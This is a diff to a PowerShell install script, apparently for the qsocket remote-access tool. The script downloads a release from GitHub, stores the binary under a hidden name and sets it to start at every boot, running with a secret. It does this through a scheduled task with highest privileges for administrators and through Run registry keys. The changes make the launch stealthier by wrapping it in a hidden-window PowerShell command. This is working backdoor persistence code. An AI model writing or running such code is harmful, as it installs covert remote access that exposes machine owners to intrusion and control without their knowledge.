@@ -97,7 +97,7 @@ function Get-Latest-Release
     Print-Debug "Package: $QS_PACKAGE"
 
     try {
-        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest"
+        $r = Invoke-WebRequest "$GITHUB_REPO/$QS_UTIL/releases/latest" -UseBasicParsing
         $lines = $r.Content.Split('"')
         $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$QS_PACKAGE")
     }catch {
@@ -128,9 +128,9 @@ function Download-Qsocket-Util($path)
 function Create-Sceduled-Task($path, $secret)
 {
     Print-Debug "Creating scheduled task..."
-    Print-Debug "Task command: cmd.exe /c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
+    Print-Debug "Task command: powershell.exe -WindowStyle Hidden -Command $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
     try {
-        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
+        $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`""
         $T = New-ScheduledTaskTrigger -AtStartup
         if(Is-Administrator){
             $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
@@ -152,10 +152,10 @@ function Create-Run-Key($path, $secret)
     try {
         if(Is-Administrator){
             Print-Debug "Running as administrator"
-            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
+            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`"" >$null
         }else{
             Print-Debug "Running as $env:UserName"
-            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "$path\$QS_BIN_HIDDEN_NAME -liqs $secret" >$null
+            reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "$path" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path\$QS_BIN_HIDDEN_NAME -liqs $secret`"" >$null
         }
     }catch {
         Print-Debug $_.Exception
